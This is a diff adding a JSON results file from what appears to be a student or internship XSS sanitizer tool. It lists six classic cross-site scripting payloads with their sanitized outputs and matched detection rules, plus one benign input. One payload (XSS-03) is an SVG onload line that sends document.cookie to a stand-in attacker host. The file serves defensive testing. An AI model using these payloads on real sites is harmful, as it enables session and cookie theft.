@@ -1,0 +1,157 @@
+{
+    "metadata": {
+        "engine": "PEER'S XSS Payload Sanitizer & Defense Suite v2.0",
+        "author": "Mohammed Peer Siddiqui",
+        "company": "Sqrock IT Solutions",
+        "timestamp": "2026-11-17T10:36:44.420014",
+        "standards": [
+            "OWASP Top 10 A03:2021",
+            "CWE-79"
+        ]
+    },
+    "csp_recommended": "Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-sqrock_secops_nonce_7749' https://trustedcdn.sqrock.com; object-src 'none'; base-uri 'self'; frame-ancestors 'none'; form-action 'self';",
+    "metrics": {
+        "total_payloads_evaluated": 7,
+        "xss_detected": 6,
+        "benign_inputs": 1,
+        "neutralized_count": 6
+    },
+    "findings": [
+        {
+            "id": "XSS-01",
+            "category": "Reflected / Classic Tag Injection",
+            "context": "html_body",
+            "severity": "CRITICAL",
+            "raw_payload": "<script>alert(document.cookie)</script>",
+            "sanitized_output": "",
+            "detected_vectors": [
+                {
+                    "rule": "SCRIPT_TAG",
+                    "description": "Explicit <script> block injection",
+                    "match_count": 1
+                },
+                {
+                    "rule": "DOM_SINK_EVAL",
+                    "description": "Sensitive DOM sink manipulation & credential harvesting",
+                    "match_count": 1
+                }
+            ],
+            "is_neutralized": true
+        },
+        {
+            "id": "XSS-02",
+            "category": "Event Handler Injection",
+            "context": "html_body",
+            "severity": "HIGH",
+            "raw_payload": "<img src=\"invalid.jpg\" onerror=\"alert('XSS')\" />",
+            "sanitized_output": "&lt;img src=&quot;invalid.jpg&quot; data-disabled-onerror=&quot;alert(&#x27;XSS&#x27;)&quot; &#x2F;&gt;",
+            "detected_vectors": [
+                {
+                    "rule": "INLINE_EVENT",
+                    "description": "Inline DOM event handler execution",
+                    "match_count": 1
+                }
+            ],
+            "is_neutralized": true
+        },
+        {
+            "id": "XSS-03",
+            "category": "SVG Vector Injection",
+            "context": "html_body",
+            "severity": "CRITICAL",
+            "raw_payload": "<svg/onload=fetch('http://attacker.com/steal?c='+document.cookie)>",
+            "sanitized_output": "",
+            "detected_vectors": [
+                {
+                    "rule": "INLINE_EVENT",
+                    "description": "Inline DOM event handler execution",
+                    "match_count": 1
+                },
+                {
+                    "rule": "DANGEROUS_TAG",
+                    "description": "High-risk executable HTML container/tag",
+                    "match_count": 1
+                },
+                {
+                    "rule": "DOM_SINK_EVAL",
+                    "description": "Sensitive DOM sink manipulation & credential harvesting",
+                    "match_count": 1
+                }
+            ],
+            "is_neutralized": true
+        },
+        {
+            "id": "XSS-04",
+            "category": "Attribute Breakout",
+            "context": "attribute_value",
+            "severity": "CRITICAL",
+            "raw_payload": "\" onfocus=\"alert(document.domain)\" autofocus=\"",
+            "sanitized_output": "&quot; data-disabled-onfocus=&quot;alert(document.domain)&quot; autofocus=&quot;",
+            "detected_vectors": [
+                {
+                    "rule": "INLINE_EVENT",
+                    "description": "Inline DOM event handler execution",
+                    "match_count": 1
+                },
+                {
+                    "rule": "DOM_SINK_EVAL",
+                    "description": "Sensitive DOM sink manipulation & credential harvesting",
+                    "match_count": 1
+                }
+            ],
+            "is_neutralized": true
+        },
+        {
+            "id": "XSS-05",
+            "category": "JavaScript Pseudo-Protocol",
+            "context": "uri_attribute",
+            "severity": "HIGH",
+            "raw_payload": "<a href=\"javascript:alert('XSS')\">Click here to claim prize</a>",
+            "sanitized_output": "&lt;a href=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;Click here to claim prize&lt;/a&gt;",
+            "detected_vectors": [
+                {
+                    "rule": "JS_PSEUDO_PROTOCOL",
+                    "description": "URI attribute pseudo-protocol execution",
+                    "match_count": 1
+                }
+            ],
+            "is_neutralized": true
+        },
+        {
+            "id": "XSS-06",
+            "category": "DOM-Based Nested Script Bypass",
+            "context": "dom_sink",
+            "severity": "CRITICAL",
+            "raw_payload": "<iframe src=\"javascript:alert(window.origin)\"></iframe>",
+            "sanitized_output": "&lt;iframe src=&quot;javascript:alert(window.origin)&quot;&gt;&lt;&#x2F;iframe&gt;",
+            "detected_vectors": [
+                {
+                    "rule": "JS_PSEUDO_PROTOCOL",
+                    "description": "URI attribute pseudo-protocol execution",
+                    "match_count": 1
+                },
+                {
+                    "rule": "DANGEROUS_TAG",
+                    "description": "High-risk executable HTML container/tag",
+                    "match_count": 1
+                },
+                {
+                    "rule": "DOM_SINK_EVAL",
+                    "description": "Sensitive DOM sink manipulation & credential harvesting",
+                    "match_count": 1
+                }
+            ],
+            "is_neutralized": true
+        },
+        {
+            "id": "BENIGN-01",
+            "category": "Benign Text Input",
+            "context": "html_body",
+            "severity": "SAFE",
+            "raw_payload": "Welcome to Sqrock IT Solutions Cybersecurity Internship Phase 2!",
+            "sanitized_output": "Welcome to Sqrock IT Solutions Cybersecurity Internship Phase 2!",
+            "detected_vectors": [],
+            "is_neutralized": true
+        }
+    ]
+}
